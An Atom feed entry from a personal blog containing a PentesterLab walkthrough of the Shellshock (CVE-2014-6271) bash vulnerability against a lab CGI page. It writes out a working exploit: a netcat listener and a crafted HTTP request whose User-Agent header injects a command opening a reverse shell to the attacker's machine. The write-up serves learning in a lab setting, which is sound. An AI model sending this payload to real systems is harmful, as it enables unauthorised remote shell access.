<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">

  <title><![CDATA[Category: cve-2014-6271 | Bob1Bob2]]></title>
  <link href="http://wg135.github.io/blog/categories/cve-2014-6271/atom.xml" rel="self"/>
  <link href="http://wg135.github.io/"/>
  <updated>2016-07-22T14:22:26-05:00</updated>
  <id>http://wg135.github.io/</id>
  <author>
    <name><![CDATA[Bob1Bob2]]></name>
    
  </author>
  <generator uri="http://octopress.org/">Octopress</generator>

  
  <entry>
    <title type="html"><![CDATA[Pentesterlab--CVE-2014-6271/Shellshock]]></title>
    <link href="http://wg135.github.io/blog/2016/03/25/pentesterlab-cve2014-6271-slash-shellshock/"/>
    <updated>2016-03-25T14:40:03-05:00</updated>
    <id>http://wg135.github.io/blog/2016/03/25/pentesterlab-cve2014-6271-slash-shellshock</id>
    <content type="html"><![CDATA[<p><em>So it is said that if you know your enemies and know yourself, you will not be put at risk even if you have a hundred battles.</em> &mdash;&ndash; The Art of War</p>

<p>This vulnerability impacts the Bourne Again Shell &ldquo;Bash&rdquo;. Bash is not usually available through a web application but can be indirectly exposed through a Common Gateway Interface &ldquo;CGI&rdquo;.</p>

<p>Difficluty: 1/5</p>

<!--more-->


<h3>Forces:</h3>

<ul>
<li>Nmap</li>
<li>Burp</li>
<li>Firebug</li>
<li>NC</li>
</ul>


<h3>Detail Assessment and Planning</h3>

<ul>
<li>Port scan to identify opened ports, running services and services version. &mdash;-Nmap</li>
<li>Identify vulnerability and path <code>/cgi-bin/status</code>. &mdash;-Burp, Firebug</li>
<li>Exploit shellshock vuln get the reverse shell &mdash;- NC</li>
</ul>


<h3>Waging War</h3>

<h4>Weaknesses and Strengths</h4>

<p>Used Nmap to idenfity opened ports. TCP port 80 is opened and Apache service is running on it.</p>

<p><img src="/images/blog/pentesterlab/shellshock/shellshock1.png" title="[title manually exploit [alt text]]" ></p>

<p>By visiting the application with Burp, I can detect that multiple URL are accessed when the page is loaded:</p>

<p><img src="/images/blog/pentesterlab/shellshock/shellshock2.png" title="[title manually exploit [alt text]]" ></p>

<p>Also by using Firebug, I can identify that CGI page which call system command <code>/cgi-bin/status</code></p>

<p><img src="/images/blog/pentesterlab/shellshock/shellshock3.png" title="[title manually exploit [alt text]]" ></p>

<h4>Attack</h4>

<h5>listen port 443</h5>

<p><code># nc -l -p 443</code></p>

<h5>exploit</h5>

<pre><code>echo -e "HEAD /cgi-bin/status HTTP/1.1\r\nUser-Agent: () { :;}; /usr/bin/nc 192.168.79.156 443 -e /bin/sh\r\nHost: 192.168.79.164\r\nConnection: close\r\n\r\n" | nc 192.168.79.164 80
</code></pre>

<p><img src="/images/blog/pentesterlab/shellshock/shellshock5.png" title="[title manually exploit [alt text]]" ></p>

<p>192.168.79.156 is the attacker&rsquo;s machine and 192.168.79.164 is victim machine.</p>

<p><img src="/images/blog/pentesterlab/shellshock/shellshock6.png" title="[title manually exploit [alt text]]" ></p>

<p><img src="/images/blog/pentesterlab/shellshock/game_over.jpg" title="[title manually exploit [alt text]]" ></p>
]]></content>
  </entry>
  
</feed>
